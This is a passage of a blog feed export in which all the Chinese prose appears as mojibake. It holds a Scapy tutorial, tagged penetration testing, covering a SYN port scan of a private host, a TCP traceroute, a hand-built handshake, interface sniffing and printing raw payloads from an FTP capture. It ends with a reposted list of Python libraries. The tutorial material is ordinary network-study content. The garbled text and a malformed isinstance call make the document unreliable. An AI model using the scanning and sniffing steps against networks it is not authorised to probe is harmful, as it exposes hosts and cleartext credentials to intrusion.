å‘é€ç¬¬äºŒå±‚æ•°æ®åŒ…ï¼Œå¹¶è¿”å›å“åº”çš„æ•°æ®åŒ… """ # ä¾‹å¦‚ï¼š ans, uans = sr(pkt) print(ans) print(uans) ç®€å•åº”ç”¨ # 4.åº”ç”¨ # 1ï¼‰å¯ä»¥æ„é€ æ•°æ®åŒ…æ¥å®ç°ä¸€ä¸ªç®€å•çš„ SYNç«¯å£æ‰«æ ï¼Œflags="S" è¡¨ç¤ºå‘é€SYNæ•°æ®åŒ… port_scan = IP(dst="192.168.0.121")/TCP(dport=[22,80,135,443,3306,3389], flags="S") ans, uans = sr(port_scan) ans.summary() ''' ç«¯å£è¿”å›çš„flagä½ä¸º SAï¼Œè¡¨ç¤ºè¿™äº›ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚ è€Œ RA è¡¨ç¤ºreset ackï¼Œ è¯´æ˜è¿™äº›ç«¯å£æ˜¯å…³é—­çš„ã€‚ ã€è§ä¸‹é¢å›¾ç‰‡ã€‘ ''' # 2ï¼‰å®ç°ä¸€ä¸ªåŸºäºTCPçš„traceroute ans, uans = sr(IP(dst="114.114.114.114", ttl=(1,20), id=RandShort())/TCP(flags="0x2")) for snd, rcv in ans: print(snd.ttl, rcv.src, isinstance((rcv.payload, TCP)) # 3) æ¨¡æ‹ŸTCPçš„ä¸‰æ¬¡æ¡æ‰‹ source = IP(dst="192.168.0.121")/TCP(dport=22) rsp = sr1(source) source2 = IP(dst="192.168.0.121")/TCP(dport=22, flags="A", seq=rsp.ack, ack=rsp.seq+1) rsp2 = sr1(source2) print(rsp2.show()) å…¶ä»– # 5.å…¶ä»– # scapy è¿˜å¯ä»¥ç”¨æ¥è¯»å–ç½‘ç»œæµé‡åŒ…æˆ–ç›‘å¬ç½‘å¡æµé‡ã€‚ """ 1. ä½¿ç”¨å‡½æ•° rdpcap("/abc/def/xxxx.pcap") å¯ä»¥è¯»å–åŒ…çš„å†…å®¹ï¼Œ 2. å†ä½¿ç”¨ haslayer(TCP) æˆ– haslayer(ICMP) ç­‰ç­‰æ¥åˆ¤æ–­æ•°æ®åŒ…çš„ç±»å‹ã€‚ 3. ä½¿ç”¨ sniff(iface="who1",count=100,filter="tcp xxxx") å¯ä»¥ç›‘å¬ç½‘å¡æµé‡ï¼Œifaceå£°æ˜ç›‘å¬çš„ç½‘å¡ï¼Œfilteræ˜¯è¿‡æ»¤æ¡ä»¶ï¼Œcountæ˜¯ç¬¦åˆè¿‡æ»¤æ¡ä»¶çš„æ•°æ®åŒ…çš„ä¸ªæ•°ï¼Œè¾¾åˆ°æŒ‡å®šçš„æ•°æ®åŒ…ä¸ªæ•°åä¼šåœæ­¢ç›‘å¬ï¼Œä¸è®¾countåˆ™æ²¡æœ‰é™åˆ¶ï¼ŒæŒ‰ctrl-c ç»“æŸç›‘å¬ã€‚ 4. sniffä¹Ÿæ”¯æŒæ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼ã€‚ """ æŠ“åŒ…ã€åˆ†æåŒ…""" prnæŒ‡å‘ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œæ„ä¸ºå°†æ”¶åˆ°çš„åŒ…ä¸¢ç»™prnæŒ‡å‘çš„å‡½æ•°å¤„ç†ï¼ˆæ³¨æ„ï¼šå›è°ƒçš„æ„ä¹‰ï¼æ¯æ”¶åˆ°ä¸€ä¸ªåŒ…å°±ä¸¢åˆ°å›è°ƒå‡½æ•°é‡Œæ‰§è¡Œä¸€ä¸‹ï¼Œæ‰§è¡Œå®Œäº†æ‰å†è·‘å›æ¥ç»§ç»­æŠ“åŒ…ï¼‰ filterä¸ºåŒ…è¿‡æ»¤è§„åˆ™ï¼ˆè¯­æ³•å‚ç…§tcpdumpè¿‡æ»¤è§„åˆ™ï¼‰ storeä¸ºæ˜¯å¦è¦å­˜å‚¨æŠ“åˆ°çš„åŒ…ï¼ˆæ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰å­˜å‚¨åˆ™ä¸ä¼šå°†æŠ“åˆ°çš„åŒ…èµ‹å€¼ç»™aï¼Œå› ä¸ºæ²¡æœ‰å­˜ä¸‹å°±æ²¡æœ‰ä¸œè¥¿å¯ä»¥èµ‹ï¼Œæ­¤å‚æ•°é»˜è®¤å¼€å¯ï¼‰ timeoutä¸ºæŠ“åŒ…æ—¶é•¿ï¼Œæ¯”å¦‚æŠ“30ç§’å°±ç»“æŸï¼ˆæ³¨æ„ï¼šå¦‚æœæ²¡æœ‰æŒ‡å®šæŠ“åŒ…æ—¶é•¿åˆ™ä¼šä¸€ç›´æŠ“ä¸‹å»ï¼Œç¨‹åºä¼šä¸€ç›´å¡åœ¨è¿™é‡Œï¼‰ ifaceä¸ºæŒ‡å®šæŠ“åŒ…çš„ç½‘å¡ """ a = sniff(prn=abc, filter='tcp port 80 and ip 192.168.1.1', store=1, timeout=30, iface='eth0') # æ­¤å‡½æ•°å¯ä»¥å°†æŠ“åˆ°çš„åŒ…å­˜åˆ°æœ¬åœ°ï¼ˆæ³¨æ„ï¼šå°†åŒ…å†™å…¥æœ¬åœ°ä¸èƒ½ä½¿ç”¨openï¼ˆ'packet.cap', 'r'ï¼‰,å› ä¸ºopenå‡½æ•°åªèƒ½å†™å…¥å­—ç¬¦ä¸²ï¼‰ã€‚ wrpcap('packet.cap', a) # æ­¤å‡½æ•°å¯ä»¥å°†æœ¬åœ°å­˜å‚¨çš„æ•°æ®åŒ…è¯»å–å‡ºæ¥ bbb = rdpcap('/root/Desktop/ftp.cap') # è¯»å–å‡ºæ¥çš„å¯¹è±¡æ˜¯ç”±Nä¸ªæ•°æ®åŒ…ç»„æˆçš„å¯è¿­ä»£å¯¹è±¡ï¼Œæ¯æ¬¡è¿­ä»£ä¸€ä¸ªåŒ… for i in bbb: try: # è¾“å‡ºæ•°æ®åŒ…çš„åº”ç”¨å±‚è´Ÿè½½ print(i.getlayer('Raw').fields['load'].decode().strip()) except : continue å…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œå‰©ä¸‹çš„åé¢æ…¢æ…¢å­¦ æ›´å¤šç”¨æ³•è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://scapy.readthedocs.io/en/latest/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Python</tag>
        <tag>Scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-å¸¸ç”¨åº“]]></title>
    <url>%2Fposts%2F1f32c333%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªï¼šhttps://www.jianshu.com/p/d25a9169fe86 å“ˆå“ˆå“ˆï¼Œæˆ‘è§å¤§ä½¬æŠŠè¿™ä¹ˆå¤šåº“éƒ½æ•´ç†å‡ºæ¥äº†ï¼Œèµ¶ç´§è½¬è½½ä¸€ä¸‹ï¼Œå¤ªå‰å®³å•¦ã€‚ åº“åç§° ç®€ä»‹ Chardet å­—ç¬¦ç¼–ç æ¢æµ‹å™¨ï¼Œå¯ä»¥è‡ªåŠ¨æ£€æµ‹æ–‡æœ¬ã€ç½‘é¡µã€xmlçš„ç¼–ç ã€‚ colorama ä¸»è¦ç”¨æ¥ç»™æ–‡æœ¬æ·»åŠ å„ç§é¢œè‰²ï¼Œå¹¶ä¸”éå¸¸ç®€å•æ˜“ç”¨ã€‚ Prettytable ä¸»è¦ç”¨äºåœ¨ç»ˆç«¯æˆ–æµè§ˆå™¨ç«¯æ„å»ºæ ¼å¼åŒ–çš„è¾“å‡ºã€‚ difflibï¼Œ[Python]æ ‡å‡†åº“ï¼Œè®¡ç®—æ–‡æœ¬å·®å¼‚Levenshteinï¼Œå¿«é€Ÿè®¡ç®—å­—ç¬¦ä¸²ç›¸ä¼¼åº¦ã€‚ fuzzywuzzy å­—ç¬¦ä¸²æ¨¡ç³ŠåŒ¹é…ã€‚ esmre æ­£åˆ™è¡¨è¾¾å¼çš„åŠ é€Ÿå™¨ã€‚ shortuuid ä¸€ç»„ç®€æ´URL/UUIDå‡½æ•°åº“ã€‚ ftfyï¼ŒUnicodeæ–‡æœ¬å·¥å…·7 unidecodeï¼Œasciiå’ŒUnicodeæ–‡æœ¬è½¬æ¢å‡½æ•°ã€‚ xpinyinï¼Œå°†æ±‰å­—è½¬æ¢ä¸ºæ‹¼éŸ³çš„å‡½æ•°åº“ pangu.pyï¼Œè°ƒæ•´å¯¹ä¸­æ—¥éŸ©æ–‡å­—å½“ä¸­çš„å­—æ¯ã€æ•°å­—é—´è·ã€‚ pyfigletï¼ŒPythonå†™çš„figletç¨‹åºï¼Œä½¿ç”¨å­—ç¬¦ç»„æˆASCIIè‰ºæœ¯å›¾ç‰‡ unioutï¼Œæå–å­—ç¬¦ä¸²ä¸­å¯è¯»å†™çš„å­—ç¬¦ awesome slugifyï¼Œä¸€ä¸ªPython slugifyåº“ï¼Œç”¨äºå¤„ç†Unicodeã€‚ python-slugifyï¼Œè½¬æ¢Unicodeä¸ºASCIIå†…ç çš„slugifyå‡½æ•°åº“ã€‚ unicode-slugifyï¼Œç”Ÿæˆunicodeå†…ç ï¼ŒDjangoçš„ä¾èµ–åŒ…ã€‚ plyï¼ŒPythonç‰ˆçš„lexå’Œyaccçš„è§£æå·¥å…·phonenumbersï¼Œè§£æç”µè¯å·ç ï¼Œæ ¼å¼ï¼Œå­˜å‚¨å’ŒéªŒè¯çš„å›½é™…ç”µè¯å·ç ã€‚ python-user-agentsï¼Œæµè§ˆå™¨çš„ç”¨æˆ·ä»£ç†ï¼ˆuser-agentsï¼‰çš„è§£æå™¨ã€‚ sqlparseï¼ŒSQLè§£æå™¨ã€‚ pygmentsï¼Œä¸€ä¸ªé€šç”¨çš„è¯­æ³•é«˜äº®å·¥å…·ã€‚ python-nameparserï¼Œè§£æäººåï¼Œåˆ†è§£ä¸ºå•ç‹¬çš„æˆåˆ†ã€‚ pyparsingï¼Œé€šç”¨è§£æå™¨ç”Ÿæˆæ¡†æ¶ã€‚ tablibï¼Œè¡¨æ ¼æ•°æ®æ ¼å¼ï¼ŒåŒ…æ‹¬ï¼ŒXLSã€CSVï¼ŒJSONï¼ŒYAMLã€‚ python-docxï¼Œdocxæ–‡æ¡£è¯»å–ï¼ŒæŸ¥è¯¢å’Œä¿®æ”¹ï¼Œå¾®è½¯Word 2007 / 2008çš„docxæ–‡ä»¶ã€‚ xlwt/xlrdï¼Œè¯»å†™Excelæ ¼å¼çš„æ•°æ®æ–‡ä»¶ã€‚ xlsxwriterï¼Œåˆ›å»ºExcelæ ¼å¼çš„xlsxæ–‡ä»¶ã€‚ xlwingsï¼Œåˆ©ç”¨Pythonè°ƒç”¨Excelcsvkitï¼ŒCSVæ–‡ä»¶å·¥å…·åŒ…ã€‚ marmirï¼ŒæŠŠPython[æ•°æ®ç»“æ„]ï¼Œè½¬åŒ–ä¸ºç”µå­è¡¨æ ¼ã€‚ pdfminerï¼Œä»PDFæ–‡ä»¶ä¸­æå–ä¿¡æ¯ã€‚ pypdf2ï¼Œ åˆå¹¶å’Œè½¬æ¢PDFé¡µé¢çš„å‡½æ•°åº“ã€‚ Python-Markdownï¼Œè½»é‡çº§æ ‡è®°è¯­è¨€Markdownçš„Pythonå®ç°ã€‚ Mistuneï¼Œ,å¿«é€Ÿã€å…¨åŠŸèƒ½çš„çº¯Pythonç¼–å†™çš„Markdownè§£é‡Šå™¨ã€‚ dateutilï¼Œæ ‡å‡†çš„Pythonå®˜æ–¹datetimeæ¨¡å—çš„æ‰©å±•åŒ…ï¼Œå­—ç¬¦ä¸²æ—¥æœŸå·¥å…·ï¼Œå…¶ä¸­parseræ˜¯æ ¹æ®å­—ç¬¦ä¸²è§£ææˆ datetimeï¼Œè€Œrruleæ˜¯åˆ™æ˜¯æ ¹æ®å®šä¹‰çš„è§„åˆ™æ¥ç”Ÿæˆdatetimeã€‚ arrow,æ›´å¥½çš„æ—¥æœŸå’Œæ—¶é—´å¤„ç†Pythonåº“ chronykï¼Œä¸€ä¸ªPython 3ç‰ˆå‡½æ•°åº“ï¼Œç”¨äºè§£æäººå†™çš„æ—¶é—´å’Œæ—¥æœŸã€‚ deloreanï¼Œæ¸…ç†æœŸæ—¶é—´çš„å‡½æ•°åº“ã€‚ when.pyï¼Œä¸ºè§çš„æ—¥æœŸå’Œæ—¶é—´ï¼Œæä¾›äººæ€§åŒ–çš„åŠŸèƒ½ã€‚ momentï¼Œç±»ä¼¼Moment.jsçš„æ—¥æœŸ/æ—¶é—´Pythonåº“ pytzï¼Œä¸–ç•Œæ—¶åŒºï¼Œä½¿ç”¨tz databaseæ—¶åŒºä¿¡æ¯[æ•°æ®åº“] BeautifulSoupï¼ŒåŸºäºPythonçš„HTML/XMLè§£æå™¨ï¼Œç®€å•æ˜“ç”¨, åŠŸèƒ½å¾ˆå¼ºå¤§,å³ä½¿æ˜¯æœ‰bugï¼Œæœ‰é—®é¢˜çš„htmlä»£ç ï¼Œä¹Ÿå¯ä»¥è§£æã€‚ lxmlï¼Œå¿«é€Ÿï¼Œæ˜“ç”¨ã€çµæ´»çš„HTMLå’ŒXMLå¤„ç†åº“ï¼ŒåŠŸèƒ½è¶…å¼ºï¼Œåœ¨é‡åˆ°æœ‰ç¼ºé™·ã€ä¸è§„èŒƒçš„xmlæ—¶ï¼ŒPythonè‡ªå¸¦çš„xmlå¤„ç†å™¨å¯èƒ½æ— æ³•è§£æã€‚æŠ¥é”™æ—¶ï¼Œç¨‹åºä¼šå°è¯•å†ç”¨lxmlçš„ä¿®å¤æ¨¡å¼è§£æã€‚ htmlparserï¼Œå®˜æ–¹ç‰ˆè§£æHTML DOMæ ‘ï¼Œå¶å°”ææå‘½ä»¤è¡Œè‡ªåŠ¨è¡¨å•æäº¤ç”¨å¾—ä¸Šã€‚ pyyamlï¼ŒPythonç‰ˆæœ¬çš„YAMLè§£é‡Šå™¨ã€‚ html5libï¼Œ-æ ‡å‡†åº“ï¼Œè§£æå’Œåºåˆ—åŒ–HTMLæ–‡æ¡£å’Œç‰‡æ®µã€‚ pyqueryï¼Œç±»ä¼¼[jQuery]çš„çš„HTMLè§£é‡Šå™¨å‡½æ•°åº“ã€‚ cssutilsï¼ŒPython CSSåº“ã€‚ MarkupSafeï¼ŒXMLæˆ–HTML / XHTMLå®‰å…¨å­—ç¬¦ä¸²æ ‡è®°å·¥å…·ã€‚ cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleachï¼Œæ¼‚ç™½ï¼ŒåŸºäºHTMLçš„ç™½åå•å‡½æ•°åº“ã€‚ xmltodictï¼Œç±»ä¼¼JSONçš„XMLå·¥å…·åŒ…ã€‚ xhtml2pdfï¼ŒHTML / CSSæ ¼å¼è½¬æ¢å™¨ï¼Œçœ‹ç”Ÿæˆpdfæ–‡æ¡£ã€‚ untangleï¼ŒæŠŠXMLæ–‡æ¡£ï¼Œè½¬æ¢ä¸ºPythonå¯¹è±¡ï¼Œæ–¹ä¾¿è®¿é—®ã€‚ æ–‡ä»¶å¤„ç† åº“åç§°ç®€ä»‹Mimetypesï¼ŒPythonæ ‡å‡†åº“ï¼Œæ˜ å°„æ–‡ä»¶ååˆ°MIMEç±»å‹ã€‚ imghdrï¼ŒPythonæ ‡å‡†åº“ï¼Œç¡®å®šå›¾åƒç±»å‹ã€‚ python-magicï¼Œlibmagicæ–‡ä»¶ç±»å‹è¯†åˆ«åº“ï¼ŒPythonæ¥å£æ ¼å¼ã€‚ path.pyï¼Œos.pathæ¨¡å—çš„äºŒæ¬¡å°è£…ã€‚ watchdogï¼Œä¸€ç»„APIå’Œshellå®ç”¨ç¨‹åºï¼Œç”¨äºç›‘è§†æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶ã€‚ Unipathï¼Œé¢å‘å¯¹è±¡çš„æ–‡ä»¶/ç›®å½•çš„æ“ä½œå·¥å…·åŒ…ã€‚ pathlibï¼Œ-ï¼ˆPython 3.4ç‰ˆå·²ç»ä½œä¸ºPythonæ ‡å‡†åº“ï¼‰ï¼Œä¸€ä¸ªè·¨å¹³å°ï¼Œé¢å‘pathçš„å‡½æ•°åº“ã€‚pickle/cPickle,pythonçš„pickleæ¨¡å—å®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—å’Œååºåˆ—åŒ–ã€‚é€šè¿‡pickleæ¨¡å—çš„åºåˆ—åŒ–æ“ä½œæˆ‘ä»¬èƒ½å¤Ÿå°†ç¨‹åºä¸­è¿è¡Œçš„å¯¹è±¡ä¿¡æ¯ä¿å­˜åˆ°æ–‡ä»¶ä¸­å»ï¼Œæ°¸ä¹…å­˜å‚¨ï¼›é€šè¿‡pickleæ¨¡å—çš„ååºåˆ—åŒ–æ“ä½œï¼Œæˆ‘ä»¬èƒ½å¤Ÿä»æ–‡ä»¶ä¸­åˆ›å»ºä¸Šä¸€æ¬¡ç¨‹åºä¿å­˜çš„å¯¹è±¡ã€‚ cPickleæ˜¯[Cè¯­è¨€]å®ç°çš„ç‰ˆæœ¬ï¼Œé€Ÿåº¦æ›´å¿«ã€‚ ConfigParserï¼ŒPythonæ ‡å‡†åº“ï¼ŒINIæ–‡ä»¶è§£æå™¨ã€‚ configobjï¼ŒINIæ–‡ä»¶è§£æå™¨ã€‚ configï¼Œåˆ†å±‚æ¬¡é…ç½®ï¼Œloggingä½œè€…ç¼–å†™ã€‚ profigï¼Œå¤šæ ¼å¼é…ç½®è½¬æ¢å·¥å…·ã€‚ loggingï¼ŒPythonæ ‡å‡†åº“ï¼Œæ—¥å¿—æ–‡ä»¶ç”Ÿæˆç®¡ç†å‡½æ•°åº“ã€‚ logbookï¼Œloggingçš„æ›¿æ¢å“ã€‚ Sentryï¼Œå®æ—¶logæœåŠ¡å™¨ã€‚ Ravenï¼Œå“¨å…µSentryçš„Pythonå®¢æˆ·ç«¯ã€‚ Sphinxï¼Œæ–¯èŠ¬å…‹æ–¯ï¼ˆç‹®èº«äººé¢åƒï¼‰ï¼ŒPythonæ–‡æ¡£ç”Ÿæˆå™¨ã€‚ reStructuredTextï¼Œæ ‡è®°è¯­æ³•å’Œè§£æå·¥å…·ï¼ŒDocutilsç»„ä»¶ã€‚ mkdocsï¼ŒMarkdownæ ¼å¼æ–‡æ¡£ç”Ÿæˆå™¨ã€‚ pyccoï¼Œç®€å•å¿«é€Ÿã€ç¼–ç¨‹é£æ ¼çš„æ–‡æ¡£ç”Ÿæˆå™¨ã€‚ pdocï¼Œè‡ªåŠ¨ç”Ÿæˆçš„Pythonåº“APIæ–‡æ¡£epydocï¼Œä»æºç æ³¨é‡Šä¸­ç”Ÿæˆå„ç§æ ¼å¼æ–‡æ¡£çš„å·¥å…· å›¾åƒå¤„ç† åº“åç§°ç®€ä»‹PILï¼ˆPython Image Libraryï¼‰ï¼ŒåŸºäºPythonçš„å›¾åƒå¤„ç†åº“ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œå¯¹å›¾å½¢æ–‡ä»¶çš„æ ¼å¼æ”¯æŒå¹¿æ³›ï¼Œå†…ç½®è®¸å¤šå›¾åƒå¤„ç†å‡½æ•°ï¼Œå¦‚å›¾åƒå¢å¼ºã€æ»¤æ³¢[ç®—æ³•]ç­‰ã€‚ Pillowï¼Œå›¾åƒå¤„ç†åº“ï¼ŒPILå›¾åƒåº“çš„åˆ†æ”¯å’Œå‡çº§æ›¿ä»£äº§å“ã€‚ Matplotlibï¼Œè‘—åçš„ç»˜å›¾åº“ï¼Œæä¾›äº†æ•´å¥—å’Œmatlabç›¸ä¼¼çš„å‘½ä»¤APIï¼Œç”¨ä»¥ç»˜åˆ¶ä¸€äº›é«˜è´¨é‡çš„æ•°å­¦äºŒç»´å›¾å½¢ï¼Œååˆ†é€‚åˆäº¤äº’å¼åœ°è¿›è¡Œåˆ¶å›¾ã€‚ brewer2mplï¼Œæœ‰ä¸€ä¸ªä¸“ä¸šçš„pythoné…è‰²å·¥å…·åŒ…ï¼Œæä¾›äº†ä»ç¾æœ¯è§’åº¦æ¥è®²çš„ç²¾ç¾é…è‰²ã€‚ PyGameåŸºäºPythonçš„å¤šåª’ä½“å¼€å‘å’Œæ¸¸æˆè½¯ä»¶å¼€å‘æ¨¡å—ï¼ŒåŒ…å«å¤§é‡æ¸¸æˆå’Œå›¾åƒå¤„ç†åŠŸèƒ½ã€‚ Box2dï¼Œå¼€æºçš„2dç‰©ç†å¼•æ“ï¼Œæ„¤æ€’çš„å°é¸Ÿå°±æ˜¯ä½¿ç”¨äº†è¿™æ¬¾ç‰©ç†å¼•æ“è¿›è¡Œå¼€å‘çš„ï¼ŒBox2dç‰©ç†å¼•æ“å†…éƒ¨æ¨¡æ‹Ÿäº†ä¸€ä¸ªä¸–ç•Œï¼Œä½ å¯ä»¥è®¾ç½®è¿™ä¸ªä¸–ç•Œé‡Œçš„é‡åŠ›ï¼Œç„¶åå¾€è¿™ä¸ªä¸–ç•Œé‡Œæ·»åŠ å„ç§ç‰©ä½“ï¼Œä»¥åŠä»–ä»¬çš„ä¸€äº›ç‰©ç†ç‰¹æ€§ï¼Œæ¯”å¦‚è´¨é‡ï¼Œæ‘©æ“¦ï¼Œé˜»å°¼ç­‰ç­‰ã€‚ Pymunkï¼Œç±»ä¼¼box2dçš„å¼€æºç‰©ç†å›¾å½¢æ¨¡æ‹Ÿåº“ã€‚ OpenCV, ç›®å‰æœ€å¥½çš„å¼€æºå›¾åƒ/è§†è§‰åº“ï¼ŒåŒ…æ‹¬å›¾åƒå¤„ç†å’Œè®¡ç®—æœºè§†è§‰æ–¹é¢ã€[æœºå™¨å­¦ä¹ ]çš„å¾ˆå¤šé€šç”¨ç®—æ³•ã€‚ SimpleCVï¼Œè®¡ç®—æœºè§†è§‰å¼€æºæ¡†æ¶ï¼Œç±»ä¼¼opencvã€‚ VTKï¼Œè§†è§‰åŒ–å·¥å…·å‡½å¼åº“ï¼ˆVTKï¼Œ Visualization Toolkitï¼‰æ˜¯ä¸€ä¸ªå¼€æ”¾æºç ï¼Œè·¨å¹³å°ã€æ”¯æ´å¹³è¡Œå¤„ç†ï¼ˆVTKæ›¾ç”¨äºå¤„ç†å¤§å°è¿‘ä¹1ä¸ªPetabyteçš„èµ„æ–™ï¼Œå…¶å¹³å°ä¸ºç¾å›½Los Alamoså›½å®¶å®éªŒå®¤æ‰€æœ‰çš„å…·1024ä¸ªå¤„ç†å™¨ä¹‹å¤§å‹ç³»ç»Ÿï¼‰çš„å›¾å½¢åº”ç”¨å‡½å¼åº“ã€‚2005å¹´æ—¶æ›¾è¢«ç¾å›½é™†å†›ç ”ç©¶å®éªŒå®¤ç”¨äºå³æ—¶æ¨¡æ‹Ÿä¿„ç½—æ–¯åˆ¶åå¯¼å¼¹æˆ˜è½¦ZSU23-4å—åˆ°å¹³é¢æ³¢æ”»å‡»çš„æƒ…å½¢ï¼Œå…¶è®¡ç®—èŠ‚ç‚¹é«˜è¾¾2.5å…†ä¸ªä¹‹å¤šã€‚ cgkit,Python Computer Graphics Kit,å…¶module ä¸»è¦åˆ†ä¸¤ä¸ªéƒ¨åˆ† \1. ä¸3dç›¸å…³çš„ä¸€äº›python module ä¾‹å¦‚the vector, matrix and quaternion types, the RenderMan bindings, noise functions è¿™äº›æ¨¡å—å¯ä»¥åœ¨maya houdini nuke blender ç­‰æœ‰Pythonæ‰©å±•çš„ç¨‹åºä¸­ç›´æ¥ç”¨; \2. æä¾›å®Œæ•´çš„åœºæ™¯æ“ä½œçš„moduleï¼Œ ä»–ç±»ä¼¼å…¶ä»–ä¸‰ç»´è½¯ä»¶ï¼Œåœ¨å†…å­˜ä¸­ä¿ç•™å®Œæ•´çš„æè¿°åœºæ™¯çš„ä¿¡æ¯ã€‚ä¸èƒ½ç›´æ¥ç”¨äºmaya ç­‰ã€‚ CGALï¼ŒComputational Geometry Algorithms Libraryï¼Œè®¡ç®—å‡ ä½•ç®—æ³•åº“ï¼Œæä¾›è®¡ç®—å‡ ä½•ç›¸å…³çš„æ•°æ®ç»“æ„å’Œç®—æ³•ï¼Œè¯¸å¦‚ä¸‰è§’å‰–åˆ†ï¼ˆ2Dçº¦æŸä¸‰è§’å‰–åˆ†åŠäºŒç»´å’Œä¸‰ç»´Delaunayä¸‰è§’å‰–åˆ†ï¼‰ï¼ŒVoronoiå›¾ï¼ˆäºŒç»´å’Œä¸‰ç»´çš„ç‚¹ï¼Œ2DåŠ æƒVoronoiå›¾ï¼Œåˆ†å‰²Voronoiå›¾ç­‰ï¼‰ï¼Œå¤šè¾¹å½¢ï¼ˆå¸ƒå°”æ“ä½œï¼Œåç½®ï¼‰ï¼Œå¤šé¢ä½“ï¼ˆå¸ƒå°”è¿ç®—ï¼‰ï¼Œæ›²çº¿æ•´ç†åŠå…¶åº”ç”¨ï¼Œç½‘æ ¼ç”Ÿæˆï¼ˆäºŒç»´Delaunayç½‘æ ¼ç”Ÿæˆå’Œä¸‰ç»´è¡¨é¢å’Œä½“ç§¯ç½‘æ ¼ç”Ÿæˆç­‰ï¼‰ï¼Œå‡ ä½•å¤„ç†ï¼ˆè¡¨é¢ç½‘æ ¼ç®€åŒ–ï¼Œç»†åˆ†å’Œå‚æ•°åŒ–ç­‰ï¼‰ï¼Œå‡¸å£³ç®—æ³•ï¼ˆ2Dï¼Œ3Då’ŒdDï¼‰ï¼Œæœç´¢ç»“æ„ï¼ˆè¿‘é‚»æœç´¢ï¼Œkdæ ‘ç­‰ï¼‰ï¼Œæ’å€¼ï¼Œå½¢çŠ¶åˆ†æï¼Œæ‹Ÿåˆï¼Œè·ç¦»ç­‰ã€‚ Aggdrawï¼Œå¼€æºå›¾åƒåº“ï¼Œå‡ ä¹æ¶µç›–äº†2d imageæ“ä½œçš„æ‰€æœ‰åŠŸèƒ½ï¼Œä½¿ç”¨èµ·æ¥éå¸¸çµæ´»ã€‚ Pycairo,å¼€æºçŸ¢é‡ç»˜å›¾åº“ Cairoå¼€ç½—çš„pythonæ¥å£ï¼Œcairoæä¾›åœ¨å¤šä¸ªèƒŒæ™¯ä¸‹åš2-Dçš„ç»˜å›¾ï¼Œé«˜çº§çš„æ›´å¯ä»¥ä½¿ç”¨ç¡¬ä»¶åŠ é€ŸåŠŸèƒ½ã€‚ wandï¼ŒPythonç»‘å®šé­”æ–å·¥å…·ï¼ˆMagickWandï¼‰ï¼ŒCè¯­è¨€APIæ¥å£ã€‚ thumborï¼Œ -æ™ºèƒ½æˆåƒå·¥å…·ï¼Œå¯è°ƒæ•´å¤§å°å’Œç¿»è½¬å›¾åƒã€‚ imgSeekï¼ŒæŸ¥è¯¢ç›¸ä¼¼çš„å›¾åƒã€‚ python-qrcodeï¼Œçº¯Pythonçš„äºŒç»´ç ï¼ˆQRç ï¼‰ç”Ÿæˆå™¨ã€‚ pyBarcodeï¼Œåˆ›å»ºæ¡ç ï¼Œæ— éœ€PILæ¨¡å—ã€‚ pygramï¼ŒInstagramåƒå›¾åƒè¿‡æ»¤å™¨ã€‚ Quadsï¼ŒåŸºäºå››å‰æ ‘çš„è®¡ç®—æœºè‰ºæœ¯ã€‚ nude.pyï¼Œè£¸ä½“æ£€æµ‹å‡½æ•°ã€‚ scikit-imageï¼Œscikitå·¥å…·ç®±çš„å›¾åƒå¤„ç†åº“ã€‚ hmapï¼Œå›¾åƒç›´æ–¹å›¾å·¥å…·ã€‚ bokehï¼Œäº¤äº’çš„Webç»˜å›¾ã€‚ plotlyï¼ŒWebååŒçš„Pythonå’ŒMatplotlibç»˜åˆ¶ã€‚ vincentï¼Œæ–‡æ£®ç‰¹ï¼ŒPython Vegaçš„å‡½æ•°åº“ã€‚ d3pyï¼ŒPythonç»˜å›¾åº“ï¼ŒåŸºäºD3.JS, ggplot -APIå…¼å®¹Rè¯­è¨€çš„ggplot2.Kartograph.pyï¼Œåœ¨Pythonç»˜åˆ¶æ¼‚äº®çš„SVGåœ°å›¾ã€‚ pygalï¼Œ SVGå›¾è¡¨çš„åˆ›é€ è€…ã€‚ pygraphvizï¼ŒGraphvizçš„Pythonæ¥å£ã€‚ Fonttloolsï¼Œttfå­—ä½“å·¥å…·å‡½æ•°åŒ…ï¼Œç”¨äºfontforgeã€ttxç­‰å­—ä½“è½¯ä»¶ã€‚ æ¸¸æˆå’Œå¤šåª’ä½“ åº“åç§°ç®€ä»‹audiolazyï¼Œæ•°å­—ä¿¡å·å¤„ç†ï¼ˆDSPï¼‰çš„Pythonå·¥å…·åŒ…ã€‚ audioreadï¼Œè·¨å¹³å°ï¼ˆGStreamer + Core Audio + MAD + FFmpegï¼‰éŸ³é¢‘è§£ç åº“ã€‚ beetsï¼ŒéŸ³ä¹åº“ç®¡ç†ã€‚dejavuï¼ŒéŸ³é¢‘æŒ‡çº¹è¯†åˆ«ç®—æ³•ã€‚ Dejavu å¬ä¸€æ¬¡éŸ³é¢‘åå°±ä¼šè®°å½•è¯¥éŸ³é¢‘çš„æŒ‡çº¹ä¿¡æ¯ï¼Œç„¶åå¯é€šè¿‡éº¦å…‹é£å¯¹è¾“å…¥çš„éŸ³é¢‘è¿›è¡Œè¯†åˆ«æ˜¯å¦åŒä¸€é¦–æ­Œã€‚ django-elastic-transcoder,Django +äºšé©¬é€Šelasticè½¬ç ã€‚ eyeD3,éŸ³é¢‘æ–‡ä»¶å·¥å…·ï¼Œç‰¹åˆ«æ˜¯MP3æ–‡ä»¶åŒ…å«çš„ID3å…ƒæ•°æ®ã€‚ 